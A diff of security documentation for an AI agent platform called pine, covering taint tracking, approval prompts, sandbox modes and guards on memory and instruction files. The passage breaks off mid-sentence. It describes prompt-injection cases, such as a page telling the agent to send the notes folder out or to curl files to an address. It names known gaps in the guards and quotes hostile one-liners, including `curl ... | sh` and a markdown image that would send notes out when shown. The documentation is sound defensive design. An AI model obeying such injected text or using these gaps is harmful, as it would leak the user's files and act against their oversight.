-This is a net, not a wall. A command line is read, not followed: what a script or a variable
-holds is not seen, a command that walks a whole folder (`grep -r secret ~`) is not followed
-into pine's home, and a program the agent starts runs with your rights. Whoever holds the
-token in `data/http-token` can answer approval requests and change modes. In a conversation
-that has read nothing from outside, getting past the net takes a model acting against you by
-itself. In one that has, nothing else stands in the way. For an agent that should not depend
-on that, use `safe` mode.
+This is a net, not a wall: what a script or a variable holds is not seen, `grep -r secret ~` is
+not followed into pine's home, and whoever holds the token in `data/http-token` can answer
+approvals and change modes. For an agent that should not depend on it, use `safe` mode.
 
 ### What asks you
 
-No model judges what an agent does. In `auto` and `safe` mode the agent works without
-asking, with two exceptions, and in `safe` mode a third. Each is a question to you:
+No model judges what an agent does. In `auto` and `safe` mode an agent works without asking,
+with these exceptions:
 
 | The action | Examples | When you are asked |
 |---|---|---|
-| is critical | shell startup files, ssh keys, git hooks and a repository's configuration, launch agents; a force push, `git reset --hard`, `git clean -f`, `curl ... \| sh`, `sudo`, deleting a home folder | In every conversation, also one that has read nothing from outside |
-| sends something out | `send` through a source that reaches somebody or something else (an MQTT device), events, the acting tools of MCP servers marked `"approve": "tainted"`, a task for another agent (its answer can carry that agent's files back), `subscribe` | Once the conversation has read outside content |
-| changes the agent's own memory or instructions, in safe mode only | `MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md` at the top of its workspace; for the main agent also `AGENTS.md`, `TOOLS.md` and `USER.md` in pine's home | Once the conversation has read outside content, and then once for the conversation. See "Its own memory and instructions after outside content" below |
+| is critical | writing shell startup files, ssh keys, git hooks or a repository's configuration, launch agents; a force push, `git reset --hard`, `git clean -f`, `curl ... \| sh`, `sudo`, deleting a home folder, `chmod -R` on a home folder, installing something that starts by itself (`crontab`, `launchctl load`, `systemctl enable`) | In every conversation |
+| sends something out | what the agent's `approveWhenTainted` names (default `publish_event` and `send`, except a `send` that reaches only you), the acting tools of MCP servers marked `"approve": "tainted"`, a task for another agent (its answer can carry that agent's files back), `subscribe` | Once the conversation has read outside content |
+| changes the agent's own memory or instructions (`safe` mode only) | `MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md` in its workspace; for the main agent also `AGENTS.md`, `TOOLS.md`, `USER.md` in pine's home | Once the conversation has read outside content, once for the conversation ("Its own memory and instructions after outside content") |
+| is on the agent's `approve` list | `"approve": ["bash:*git push*", "send:house", "mcp__calendar__delete_*"]` in `agent.json`; an MCP server with `"approve": "always"` | Every time, in every mode but `bypass` |
 
-Everything else runs, also after outside content: shell commands, files anywhere the agent
-reaches, downloads, and a message to you. In `auto` and `bypass` mode the agent's own memory
-and instructions too.
+Everything else runs, also after outside content: shell commands, files the agent reaches,
+downloads, a message to you. `manual` asks about every action, `plan` refuses what does not only
+look, `bypass` asks nothing ("Modes").
 
-**Telling you is never asked about.** An agent that watches something (a camera, a device, a
-page) has read outside content by the time it has something to say, and it says it when you
-are not there. So `send` through a source that reaches you and nobody else goes out at once
-in every conversation: the Telegram source, which writes only to the chat you paired or
-listed. What an agent writes to you there you read as you read its answers; it leaves
-nothing with anybody else. The source decides where a message goes, not the call (layer 9),
-and the agent is told with its next message that this way stays open. To see every such
-message before it is sent, put it on the agent's `approve` list (`"approve": ["send:telegram"]`,
-with the source's name): that asks in every conversation. (In `manual` mode it waits like every
-action.)
+**Telling you is never asked about.** An agent that watches something has read outside content
+by the time it has something to say, often when you are away. So a `send` through a source that
+reaches only you (Telegram, which writes only to your chat) goes out at once in every
+conversation. To see each such message first, put it on the `approve` list
+(`"approve": ["send:telegram"]`, with the source's name).
 
-Critical actions are found by a fixed list of patterns, which you can read in
-`src/actions.ts` (`criticalCommand`, `PROTECTED_HOME`). Patterns are a net, not a wall: a
-script, a variable or a program the agent starts can do the same thing unseen.
-
-The dialog has "Always here" for both kinds. For a critical action it covers that kind of
-action (for example "runs with administrator rights") for the rest of the conversation, not
-the whole shell. For sending it covers that tool or server. A yes given before the
-conversation read outside content does not carry over once it has: you are asked again, and
-the question says that the request may come from that content.
-
-Once a conversation has **read outside content** (a web page, a search result, a message
-from somebody else), somebody else may be steering the agent. What pine does about it, and
-what it does not:
-
-- Sending something out asks you (above). A message to you does not.
-- In `safe` mode, changing the agent's own memory or instructions asks you, once for the
-  conversation (below).
-- The file tools refuse to write what somebody else would read as instructions, and what
-  makes git run programs (layer 4).
-- Nothing looks at an ordinary shell command. In `auto` mode, a page that talks the agent
-  into `curl`-ing one of your files to an address is not stopped. An agent that reads the
-  web and should not be able to do that belongs in `safe` mode, where its shell has no
-  network until you grant it.
-
-In `manual` you approve each action yourself; `plan` refuses every action that does not
-only look; `bypass` asks nothing.
+Critical actions are found by a fixed list of patterns (`src/actions.ts`): a net, since a
+script or a variable can do the same unseen. After outside content nothing looks at an ordinary
+shell command either: in `auto` mode a page that talks the agent into `curl`-ing one of your
+files to an address is not stopped. An agent that reads the web and must not do that belongs in
+`safe` mode, whose shell has no network until you grant it.
 
 ### Its own memory and instructions after outside content
 
-An agent's own files (`MEMORY.md`, `AGENTS.md`, `SOUL.md` and `TOOLS.md` at the top of its
-workspace; for the main agent also the files for all agents, `AGENTS.md`, `TOOLS.md` and
-`USER.md` in pine's home) are read into every later conversation. What a page talks it into
-writing there stays after the conversation is reset, and a new conversation reads it as the
-agent's own instructions, without the outside-content mark. So in `safe` mode an agent that
-has read a web page asks you before it first saves a note in its memory or changes its
-instructions:
+An agent's own files (`MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md` in its workspace; for the
+main agent also those for all agents in pine's home) are read into every later conversation,
+without the outside-content mark, so what a page talks it into writing there outlives a reset.
+In `safe` mode an agent that has read a web page therefore asks you before it first saves a note
+in its memory or changes its instructions:
 
 | Situation | What happens |
 |---|---|
-| The conversation has read nothing from outside | The agent changes its own files freely, by tool and by command |
-| It has, and wants to change one of them | You are asked once: "Yes" lets it change all of them in this conversation, "No" keeps them closed in this conversation. Calls made side by side wait for the one question |
-| You said yes | It holds until the conversation is reset, also after pine restarts. Undoing the message that read the outside content takes it back with the mark |
-| You said no | Every later change in the conversation is refused without a question, until the conversation is reset or pine restarts |
-| Nobody answered | Nothing is changed, and the next change asks again |
-| A shell command that names the file | Asks the same question before it runs (`echo ... \| tee -a MEMORY.md`) |
-| A shell command that writes the file without naming it (a script, a variable) | The sandbox refuses the write, and the agent is told to use the write or edit tool, which asks |
-| A sub-agent of the conversation | Has the conversation's answer. Without a yes its change is refused at once and it says so in its answer; it never waits for you |
-| A task handed to another agent (delegate) | That agent's own files are its own: it asks you itself, once for that task (a task in a `thread` keeps the answer like a conversation) |
-| A reset | The conversation is clean again: nothing is asked until it reads outside content again. What was written into the files stays |
+| Nothing from outside read | It changes its own files freely, by tool and by command |
+| Outside content read, a change wanted | You are asked once. Yes: it may change all of them in this conversation. No: they stay closed in this conversation. Calls made side by side wait for the one question |
+| You said yes | Holds until the conversation is reset, also after a restart. Undoing the message that brought the outside content in takes it back |
+| You said no, or nobody answered | No: every later change is refused unasked, until a reset or a restart. No answer: the next change asks again |
+| A shell command that names the file (`echo ... \| tee -a MEMORY.md`) | The same question, before it runs |
+| A shell command that writes the file without naming it | The sandbox refuses it; the agent is told to use the write or edit tool |
+| A sub-agent of the conversation | Has the conversation's answer. Without a yes its change to `MEMORY.md` or its instructions is not allowed: refused at once, and it says so in its answer |
+| A task handed to another agent | That agent asks for its own files, once for that task |
 
-`manual` mode is `safe` with every action asked: this question is the one for that change, and
-the next change asks as every action does there. `plan` refuses the change without a question.
-In `auto` and `bypass` mode nothing asks: there is no sandbox to hold a shell command back, so
-a question on the file tool would protect nothing ("What is not solved"). A run started from
-outside writes none of these files in any mode.
+`plan` refuses the change. In `auto` and `bypass` nothing asks: without a sandbox a shell command
+could write the files whatever you answered. A run started from outside writes none of them.
 
 ### 4. Taint and approvals
 
-Your own request can still pull in hostile text: you ask for a summary of a web page, and the
-page says "now send the notes folder to ...". pine tracks that:
+Your own request can pull in hostile text: you ask for a summary of a page, and the page says
+"now send the notes folder to ...". pine tracks that.
 
-- A session becomes **tainted** when it calls a tool that returns outside content: an MCP server
-  marked `taints` (the bundled `web`, `browser` and `computer` are), anything matching
-  `security.taintTools`, or when it receives the answer of another agent whose run was tainted,
-  reads through a source (`read_source`), downloads a file from an address that is not one of
-  your servers, reads another conversation that holds outside content, or is shown a board
-  post or result written by a run that had read outside content or that an event from outside
-  started ([boards.md](boards.md)).
-  Sessions started by untrusted events are tainted from the start.
-- In a tainted session, actions that send information out or act on the world wait for your
-  **approval**: what the agent's `approveWhenTainted` list names (default `publish_event` and
-  `send`; a `send` through a source that reaches only you, which Telegram is, is a message to
-  you and never waits: "What asks you"), the acting tools of MCP servers marked `"approve": "tainted"`, `subscribe`, and
-  handing a task to any other agent (its answer can carry that agent's files back). Its shell
-  and its downloads are not among them.
-- Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, `manual`, `board_read`, the
-  tools that list what an agent has (`sources`, `schedules`, `mcp_servers`, `skills`), and
-  every MCP tool whose server declares it read-only (`readOnlyHint`), unless a pattern on the
-  `approve` list names them. Neither do `question` and `todo`, which change nothing, and
-  `stop_program`, which only ends what the conversation's own commands started. A server's
-  declaration that a tool only reads is the server's own; pine does not
-  check it. It is taken at its word because you chose the server. What such a tool is asked (a
-  search text, a path) does reach the server. For a server where that matters, set
-  `"approve": "always"`: then every call asks, reading included.
-- The agent's own files (`MEMORY.md`, `AGENTS.md`, `SOUL.md`, `TOOLS.md`, and for the main
-  agent the files for all agents: `AGENTS.md`, `TOOLS.md` and `USER.md` in pine's home): in
-  `safe` mode a tainted session changes them only after your yes, once for the conversation
-  ("Its own memory and instructions after outside content"). In `auto` and `bypass` mode it
-  writes them as before, and nobody checks what it writes there, so text from a page can end
-  up in the agent's memory, and through the main agent in every agent's instructions ("What
-  is not solved"). A run started from outside writes none of them.
-  Everything else that would be read as instructions (`CLAUDE.md`, `AGENTS.md` further
-  down in the workspace, `.pi/`, `.agents/`, the instruction files of a folder opened for the
-  conversation) is refused, with no question: by the file tools in every mode, and for shell
-  commands by the sandbox (`safe`, `manual`). In `auto` mode nothing looks at a shell command
-  that writes such a file. Other notes in the
-  workspace can always be written; they are not read unless the agent opens them.
-- A tainted session can still use git in a repository there (commit, branch, diff), but cannot
-  change what makes git run programs: `.git/hooks` and `.git/config` (a hook, a hooks path, a
-  pager, a file system monitor), also of submodules and of repositories further down, and it
-  cannot move a `.git` folder aside to put another in its place. Anything put there would run
-  with your rights the next time you use git in that folder. In the sandbox the operating
-  system refuses it. Without one (`auto`) the file tools refuse it, and a shell command that
-  names a hook or a repository's configuration is critical: you are asked. A session
-  that has read no outside content can change them, like everything else in its folders.
-- Events a tainted session publishes are `untrusted`.
+A session is **tainted** (has read outside content) when it calls a tool that returns outside
+content: an MCP server marked `taints` (the bundled `web`, `browser` and `computer` are),
+anything matching `security.taintTools`, or `read_source`; or when it receives the answer of
+another agent whose run was tainted, downloads a file from an address that is not one of your
+servers (or from a server marked `taints`), reads another conversation that holds outside
+content, or is shown a board post or result written by a tainted run or one an event from
+outside started ([boards.md](boards.md)). A run started by an untrusted event is tainted from
+the start, and what a tainted session publishes is `untrusted`.
 
-An approval request arrives in the terminal UI and the Pine app as a dialog and in Telegram with
-buttons, showing the agent, the tool and its arguments, and why you are asked. A Telegram bot
-that is one agent's own shows that agent's requests and questions and no other agent's, and
-cannot answer another agent's; a bot for all agents shows every agent's. `pine approvals`,
-`pine approve <id>` and `pine deny <id>` do the same from a terminal. No answer within
-`security.approvalTimeout` means no. The agent is told the action was not approved and to report
-instead of retrying.
+In a tainted session, besides the questions of "What asks you":
 
-There are three answers: allow once, deny, and **always in this conversation** ("Always here" in
-the UI, the "Always: ..." button in Telegram, `pine approve <id> --always`). "Always" covers the
-whole MCP server the tool belongs to, or the one tool if it is not from a server (`bash`, for
-example), until the conversation is reset or the daemon restarts. For a critical action it
-covers that kind of action. Two things to know:
+- What would be read as instructions is refused, without a question: `CLAUDE.md`, `AGENTS.md`
+  further down in the workspace, `.pi/`, `.agents/`, the instruction files of a folder opened
+  for the conversation. The file tools refuse it in every mode; the sandbox refuses a shell
+  command in `safe` and `manual`; in `auto` nothing looks at a shell command that writes one.
+  Other notes in the workspace can always be written.
+- Git still works (commit, branch, diff), but what makes git run programs cannot be changed:
+  `.git/hooks` and `.git/config` (a hook, hooks path, pager, file system monitor), also of
+  submodules and nested repositories, and a `.git` folder cannot be swapped. Anything there
+  would run with your rights the next time you use git. The sandbox refuses it; without one
+  (`auto`) the file tools refuse it and a shell command that names a hook or a repository's
+  configuration is critical.
 
-- It is not offered for what you configured to ask every time (the `approve` list, a server with
-  `"approve": "always"`).
-- A yes given while the conversation was clean does not carry over once it has read outside
-  content. You are asked again, and that answer then holds.
+Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, `manual`,
+`board_read`, the lists (`sources`, `skills`, ...), `question`, `todo`, `stop_program`, and every
+MCP tool its server declares read-only (`readOnlyHint`), unless the `approve` list names them.
+That declaration is the server's word; set `"approve": "always"` on a server to have every call
+asked, reading included.
 
-Taint lasts for the life of the session (`security.taint: "session"`), because the text is still
-in the context. `/reset` in the terminal UI, or `pine reset`, clears it along with the
-conversation. `/undo` clears it only when the message that is taken back is the one that
-brought the outside content in: that text then leaves the context with the message, and
-what you allowed the conversation while the message was worked on is taken back too.
-A branch of a conversation ([agents.md](agents.md#branching-a-conversation)) starts with the
-mark the conversation had at the point it was branched from, never without it; when pine has
-no record of that point it takes the mark the conversation has now. What you allowed the
-conversation is not carried into a branch.
-`"run"` forgets it after each task, which is more convenient and weaker. `"off"` means no tool
-call marks a conversation at all: what a subscribed source reports then arrives with full tools
-and no questions. Runs that an outside event started stay restricted in every setting.
+An approval arrives in the terminal UI and the Pine app as a dialog, and in Telegram with
+buttons (a bot that is one agent's own shows only that agent's), with the tool, its arguments
+and why you are asked. `pine approvals`, `pine approve <id>` and `pine deny <id>` do the same
+from a shell. No answer within `security.approvalTimeout` means no.
 
-`approve` in `agent.json` lists actions that need approval every time, in every mode but
-`bypass`, tainted or not (bypass skips them like everything else):
+There are three answers: allow once, deny, and **always in this conversation** ("Always here"
+in the UI, "Always: ..." in Telegram, `pine approve <id> --always`). "Always" covers the whole
+MCP server the tool belongs to, or the one tool otherwise (`bash`), and for a critical action
+that kind of action (for example "runs with administrator rights"), until the conversation is
+reset or the daemon restarts. It is not offered for what you set to ask every time (the
+`approve` list, `"approve": "always"`). A yes given while the conversation was clean does not
+carry over once it has read outside content: you are asked again.
 
-```json
-{ "approve": ["bash:*git push*", "send:house", "mcp__calendar__delete_*"] }
-```
+How long the mark lasts is `security.taint`: `session` (default) until the conversation is reset
+(`/reset`, `pine reset`), since the text is still in the context; `run` forgets it after each
+task (weaker); `off` marks nothing. Runs started by outside events stay restricted in every
+setting. Taking back the very message that brought the outside content in clears the mark
+([coding.md](coding.md), "Taking a message back"). A branch ([agents.md](agents.md#branching-a-conversation)) starts with the mark the
+conversation had at that point, and without what you allowed the original.
 
 ### Modes: how much an agent does without asking
 
-Each agent has a mode. It decides what happens at the two boundaries above: the sandbox and the
-approval prompts.
+Each agent has a mode. It says both whether there is a sandbox and what is asked; there is
+nothing else to set.
 
 | Mode | Sandbox | What asks you |
 |---|---|---|
-| `auto` (the main agent, unless you say otherwise) | Off: shell and file tools reach your whole account and the network | Almost nothing. Your `approve` list asks. A critical action asks, in every conversation. After outside content, sending something out asks. See "What asks you" above |
-| `safe` (every other agent, unless you say otherwise) | On: the agent's own folders. For anything beyond you are asked: by pine when a call needs it, or by the agent with `request_access` | As in `auto`, and after outside content a change to the agent's own memory or instructions, once for the conversation |
-| `manual` | On, where the machine has one | Every action that changes or sends something waits for you, unless you answered "always" for it in this conversation. Reading files and state and read-only MCP tools are free |
-| `bypass` | Off: shell and file tools reach your whole account and the network | Nothing waits |
-| `plan` | That of the mode the agent had before: planning lies on top of it | Nothing waits, because nothing is done: a call that does not only look is refused, without a question. See "Plan mode" below |
+| `auto` (the main agent, unless you say otherwise) | Off: shell and file tools reach your whole account and the network | Your `approve` list; a critical action, in every conversation; after outside content, sending something out ("What asks you") |
+| `safe` (every other agent, unless you say otherwise) | On: the agent's own folders. Beyond them you are asked, by pine when a call needs it or by the agent with `request_access` | As `auto`, and after outside content a change to its own memory or instructions, once for the conversation |
+| `manual` | On, where the machine has one | Every action that changes or sends something, unless you answered "always" for it here. Reading files and state and read-only MCP tools are free |
+| `bypass` | Off, like `auto` | Nothing |
+| `plan` | That of the mode the agent had before | Nothing, because nothing is done: a call that does not only look is refused ("Plan mode") |
 
-One setting says both things, so there is nothing else to set: an agent that should work with
-your account is in `auto`, one that should stay in its folders is in `safe`. pine's own home
-and program are closed in every mode, and a run that an event from outside started works in
-the sandbox and is never asked, whatever the agent's mode.
+pine's home and program are closed in every mode. A run that an event from outside started
+works in the sandbox whatever the mode: it is never asked for more access, and what your
+`approve` list names, a critical action, or sending something out is still put to you.
 
-The same actions in each mode. "After outside content" means after the conversation has read
-a web page, a message from somebody else or other outside content.
+The same actions in each mode ("after outside content": after the conversation has read a web
+page, a message from somebody else or other outside content):
 
 | Action | `bypass` | `auto` | `safe` | `manual` | `plan` |
 |---|---|---|---|---|---|
 | `ls`, `cat`, `git status`, reading files, web search and reading pages | runs | runs | runs | runs | runs |
 | Writing a file in its own workspace | runs | runs | runs | asks | refused |
-| `npm install`, `git commit`, editing a project file in your home | runs | runs | asks once for access to that folder, then runs | asks | refused |
-| `curl`, `git push`, anything that needs the network from the shell | runs | runs | asks once for network access, then runs | asks | refused |
+| `npm install`, `git commit`, editing a project file in your home | runs | runs | asks once for access to that folder | asks | refused |
+| `curl`, `git push`, anything that needs the network from the shell | runs | runs | asks once for network access | asks | refused |
 | `sudo`, a force push, `git reset --hard`, `curl ... \| sh`, shell startup files, ssh keys | runs | asks | asks | asks | refused |
 | A tool on the agent's `approve` list | runs | asks | asks | asks | asks if it only looks, else refused |
 | Sending an event, an MQTT or Slack message, a task for another agent | runs | runs | runs | asks | refused |
-| The same after outside content | asks, because bypass is paused then (below) | asks | asks | asks | refused |
+| The same after outside content | asks (bypass is paused then) | asks | asks | asks | refused |
 | A Telegram message to you, also after outside content | runs | runs | runs | asks | refused |
 | Writing its own `MEMORY.md`, `AGENTS.md`, `SOUL.md` or `TOOLS.md` | runs | runs | runs | asks | refused |
-| The same after outside content | runs | runs | asks once for the conversation ("Its own memory and instructions after outside content") | asks | refused |
+| The same after outside content | runs | runs | asks once for the conversation | asks | refused |
 | Writing `CLAUDE.md`, `.pi/`, `.agents/`, a git hook or a repository's configuration after outside content | file tools refuse; the shell runs | file tools refuse; the shell runs, and a command that names a hook or a repository's configuration asks | refused | refused | refused |
 | Opening an address on this computer or your network in the browser | runs | asks once for that address | asks once for that address | asks once for that address | refused |
 | Operating your apps (`computer` server) | runs | asks once for each app | not available: it needs your whole account | not available | looking at an app runs (after your yes for it), acting refused |
 | Starting sub-agents | runs | runs | runs | asks | refused |
 
-So `auto` asks rarely, `safe` asks whenever the agent has to leave its own folders, `manual`
-asks every time, and `plan` does nothing but look. Once a conversation in `bypass` has read
-outside content, bypass is paused and it behaves like `auto`, in every row. Where a row asks,
-a sub-agent does not: the call is refused and its conversation can ask. A run started from
-outside works in `safe` whatever the mode, asks nothing (what would ask is refused), and
-writes none of the agent's own files. The main agent starts in `auto`, every other agent in
-`safe`.
+So `auto` asks rarely, `safe` asks when the agent leaves its own folders, `manual` asks every
+time, and `plan` only looks. A yes to an address in the browser ([mcp.md](mcp.md), "Local
+addresses") or to an app ([computer.md](computer.md)) holds for that address or app in the
+conversation. An address you type yourself into the Pine app's browser is allowed without a
+question; pine's control port stays closed.
 
-`request_access` is how an agent in the sandbox gets at something outside its
-workspace: it names a path (read, or read and write) or asks for network access from its shell,
-with a reason. You see the request like any approval. If you allow it, the access holds for that
-conversation until you reset it or the daemon restarts. The agent does not have to call it:
-when a call needs something outside, pine asks you the same question itself (see "When a call
-needs something outside" above).
+**Sub-agents share their conversation's permissions**: the access you granted, your "always"
+answers, its folder and its outside-content mark. A sub-agent never asks you anything: where you
+would be asked, it is refused and says what it needed, and its conversation can ask. An agent a
+task is *delegated* to works with its own permissions, held to the caller's mode where that is
+stricter: an agent in `safe` mode cannot reach your account through one in `bypass`
+([agents.md](agents.md), "Handing work to another agent").
 
-The bundled browser has one question of the same kind: when the agent opens an address on this
-computer or your network (`http://localhost:5173`), you are asked, and a yes allows that host
-and port for the conversation. See "Local addresses" in [mcp.md](mcp.md). An address on this
-computer that you type yourself into the browser beside a conversation in the Pine app is
-allowed for that conversation without a question: the agent can open it too. pine's control
-port stays closed.
+**Bypass is paused after outside content**: the conversation behaves like `auto` until it is
+reset, since bypass plus a hostile page is your whole account. The terminal UI shows "bypass
+(paused)", and the agent is told. Two ways to have bypass anyway:
 
-App control (the bundled `computer` server: macOS, Windows, Linux with X11) has one as well: the first time the agent
-looks at or acts in an app, you are asked, and a yes allows that app for the conversation.
-After it, what the agent does there is not asked about click by click. Only an agent in `auto` or `bypass` mode has these tools, only in your own conversations,
-never in a run started from outside. See [computer.md](computer.md).
+- For one conversation: choose bypass in a conversation that already read outside content, and
+  answer "bypass in this one anyway" instead of a clean conversation. It holds until a reset or
+  a change of mode.
+- Always: `"security": { "bypassWhenTainted": true }`, which `pine check` names.
 
-**Sub-agents share their conversation's permissions.** A sub-agent is a copy of the agent doing
-part of the conversation's job, so it works under what you allowed there: the access you
-granted, and your "always" answers.
-A sub-agent never asks you anything itself: it works unattended, often several at once, and a
-question would leave it waiting. Where you would be asked, it is refused and told to say in its
-answer what it needed, and the conversation that started it asks you, once. The model a
-sub-agent runs on can be another one than the agent's (`model` of `subagent`); nothing of the
-above depends on the model, and a run started by an outside event chooses none. Nothing is
-widened by this: a sub-agent inherits the conversation's outside-content mark
-as well, and another conversation of the same agent, or a run started by an outside event, has
-none of it. An agent that a task is *delegated* to is a different agent with its own sandbox and
-its own permissions, held to the mode of the agent that handed the task on where that mode is
-stricter than its own: an agent in `safe` mode cannot reach your account by asking one in
-`bypass` mode to do it ([agents.md](agents.md), "Handing work to another agent").
+With either, the guards on instruction files and git settings no longer hold for shell commands
+in that conversation; the file tools still refuse them.
 
-**Downloads.** In the sandbox the shell has no network, but getting a file from a
-server you connected is routine, so there is a `download` tool for it. It fetches an address into
-the workspace, byte for byte, and reports size and SHA-256.
+Set the mode in `agent.json` (`{ "mode": "manual" }`), for all agents that name none with
+`defaults.mode` in `pine.json` ([configuration.md](configuration.md)), or switch it while
+running: `/mode` or `shift+tab` in the terminal UI, `pine mode <agent> <mode>` from a shell. A
+switch to `auto`, `safe` or `manual` is saved in `agent.json`; one to `bypass` or `plan` lasts
+until pine restarts.
 
-- An address on the origin of one of the agent's remote MCP servers (same scheme, host and port
-  as the server's `url`) is fetched without a question. A redirect that leads elsewhere is not
-  followed under this rule.
-- A server's `headers` (its key) go with a download only for an address that one of that
-  server's own tools returned in the same conversation, exactly as it was returned. The agent
-  cannot make pine send the key to an address it thought of itself, a redirect takes no key
-  along, and a server marked `taints: true` never has its key sent this way: a link in its
-  answers may be somebody else's text. The key itself stays out of the conversation.
-- An agent with the bundled `web` or `browser` server can already read any public address
-  without asking, so it may also save what is there: any public https address is fetched without
-  a question, also in a session that has read outside content. The `allowHosts` and `denyHosts`
-  of the `web` server apply while the conversation has no network access of its own; its
-  `allowPrivate` applies too, and then addresses on your network and plain http are fetched.
-  The session is marked as having read outside content.
-- Without web access, any other address needs network access for the conversation
-  (`sandbox.network`, a grant from `request_access`, or `auto` or `bypass` mode). Without it the download is
-  refused and you are not asked. With it, only https and only public addresses are fetched, and a
-  file from an address that is not one of your servers marks the session as having read outside
-  content.
-- The daemon does the fetching; the file is put in place the way the write tool writes: through
-  the agent's sandbox where it works in one, so that the operating system decides where it may land. `limits.maxDownloadMb`
-  (default 200) caps the size. Runs with the reduced tool set (layer 2) do not have the tool.
+#### Plan mode
 
-**Pictures in the terminal UI.** Showing pictures adds four read paths to the control API (see
-[operations.md](operations.md)); all need the API token like everything else there.
-
-- The path of a workspace picture comes from model output, so that endpoint serves only regular
-  image and video files (checked by content, not by name) that really lie inside the agent's
-  workspace or the folder opened for that conversation.
-  It cannot be used to read other files, also not through a link.
-- A picture at a web address is fetched only when you click it, never because an answer
-  contains it. Otherwise `![](https://somewhere/?q=<your notes>)` in an answer would send data
-  out the moment it is displayed.
-- Picture files are decoded by macOS's `sips` (on Linux by `ffmpeg`) and videos by `ffmpeg`, both started without
-  network access and without write access outside the temp folder, because the bytes can come
-  from anywhere. A sound file is decoded the same way for the bars its line shows (by `ffmpeg`,
-  or macOS's `afconvert`), and played by a player that is confined like them. "Open in player"
-  hands the file to the system's player, which has no such limits; it only happens on your click.
-- Pictures a tool returned are kept in `data/media/tool` (mode 600) for as long as the event
-  log reaches back (`limits.eventRetentionDays`).
-
-**Event sources.** A source ([sources.md](sources.md)) brings in content from outside by
-design, and a subscription lets that content start an agent turn without you. What keeps this
-safe:
-
-- Events of a source are outside content unless you mark the source `"trust": "owner"`. By
-  default an event is delivered into the conversation the agent subscribed in, framed as data,
-  and that conversation is then tainted (layer 4): sending things out and acting on the world
-  ask you first, bypass is paused. The agent does keep its tools there, as it does after
-  reading a web page; with `"separate": true` on the subscription the event instead starts a
-  run with the reduced tool set in a session of its own (layer 2), which is the stronger
-  protection for sources that carry strangers' text.
-- An agent can set up a source itself (`add_source`), but only in a conversation with you, and
-  you confirm everything that opens something new: a folder outside its workspace (which it may
-  then also read), a connection, a port, a source for all agents, a source to be trusted as
-  yours. Only a folder in its own workspace goes through without a question, and
-  not in a conversation that has read outside content or in manual mode. A secret that pine
-  makes (a webhook's secret, an FTP drop's password) is not shown to the model: the agent is
-  told the name of its `.env` entry. A password you tell the agent passes through the tool call
-  once. Either way the value is stored in `.env`, never in `pine.json` or an `agent.json`, and
-  is kept out of events and logs.
-- Subscribing is something only you, or an agent in a conversation with you, can do. A run
-  with the reduced tool set (started by an untrusted event through a route, or by a
-  subscription with `"separate": true`) has no `subscribe` tool. In a conversation that has
-  read outside content, which includes one that an event of a subscribed source arrived in,
-  the tool asks you first: otherwise a web page or a file name could make an agent start
-  listening to something.
-- A source that nobody subscribed to is not running: no open port, no connection (unless you
-  marked it `"start": "always"`).
-- The `ftp` type only receives, needs a password, writes under names of its own choosing into
-  its own folder, and can be limited to client addresses. The `webhook` type needs a secret
-  unless it is set up with `"open": true`, which the dialog spells out.
-- The other types that listen on a port do the same: `smtp` (mail from devices) only
-  receives, relays nothing, and needs a password or a list of client addresses; `syslog` has
-  no login in its protocol, so without a list of sender addresses (`allow`) the dialog says
-  that anyone on the network can write lines, and `pine check` says so afterwards.
-- A type that connects out (`feed`, `calendar`, `stream`, `mail`, `slack`, `matrix`,
-  `discord`, `zulip`, `http`) reaches the address you confirmed and no other: a public name that one
-  day leads into your network is refused, a redirect to another host is not followed, and a
-  token goes only to the host it was given for. An address a camera hands back (`onvif`) is
-  used for its path only.
-- What people write is never taken for your words. A mail's sender line can be forged and a
-  channel is read by others, so `mail`, `smtp`, `slack`, `matrix`, `discord` and `zulip` report
-  outside content, whoever the message says it is from. Do not give such a source
-  `"trust": "owner"`; `pine check` names every source that has it.
-- A source that can also send (`mail`, `slack`, `matrix`, `discord`, `zulip`, `mqtt`) sends only to
-  the addresses, channels, rooms or topics on its own list, checked by the type itself. Such a
-  send is asked about after outside content like any other way of sending something out.
-- A look of an `http` source with `render` is made by pine's browser, started for that one
-  look and closed after it. It runs behind the same guard as the browser tools (your network
-  and this computer are closed to the page and to everything it loads, except the one local
-  address you confirmed), has no tools, keeps no cookies, and is handed no token. The page's
-  own scripts run in it, which the dialog says.
-- Reading through a source (`read_source`: the earlier messages of a Slack channel or thread)
-  only reads and is not asked about. It reads where the source listens and no further, which
-  the source's type checks itself. What it returns marks the conversation as having read
-  outside content, so whatever would send something out afterwards is put to you. A run
-  started from outside does not have the tool.
-- A command that is followed (`command` with `follow`) runs in the agent's sandbox like one
-  that is run again and again, and ends with its source. On Linux it is refused.
-- The `system` type starts one helper program, built by pine from its own source into pine's
-  data folder; no option of a source names a program for the daemon to run.
-- A subscription has a throttle (10 s unless you change it), so a device that reports every
-  second cannot keep a model busy.
-
-What no mode opens:
-
-- pine's home: configuration, `.env`, credentials, the database, other agents' folders.
-  Agents never write there. (In `auto` and `bypass` mode pine keeps that by reading what is
-  about to run, not through the operating system: "pine's own files without a sandbox"
-  above.) What they may set up goes through tools that check what they are
-  given and write only that ([setup.md](setup.md)): an MCP server (`add_mcp_server`, which
-  asks you in every mode with the name and the URL or command; a local server added this way
-  runs where the agent's commands run, its sandbox or your account, never with the daemon's environment), event sources and subscriptions, and, for the
-  main agent alone, a new agent (`create_agent`, which always asks you and shows its
-  instructions) and a model server of your own (`add_model_server`: you confirm the address
-  every time, before any request goes there; its key is typed into pine's dialog and kept in
-  `.env`; the name cannot be a provider's that exists, so no stored key is sent to a new
-  address; refused in a conversation that has read outside content), and one model of such a
-  server (`add_model`, `configure_model`, `remove_model`: no new address, you confirm every
-  change, and adding or changing one is refused in a conversation that has read outside
-  content). The main agent is also the
-  one that changes, renames and removes agents and changes pine's settings and routes (`update_agent`,
-  `rename_agent`, `remove_agent`, `set_setting`, `add_route`, `remove_route`): each takes a few named values and checks them, shows you the
-  change before it is made, notes where it gives an agent more (the account, the network,
-  bypass mode), reads the configuration back through the loader and undoes what
-  does not load, and is refused outright, without a question to you, in a conversation that
-  has read outside content. It also lists, reads, pins, renames and removes conversations, its
-  own and other agents' (`conversations`, `read_conversation`, `set_conversation`,
-  `remove_conversation`): what another agent's tools returned is never shown to it, a
-  conversation that holds outside content marks the one that reads it, the two that change
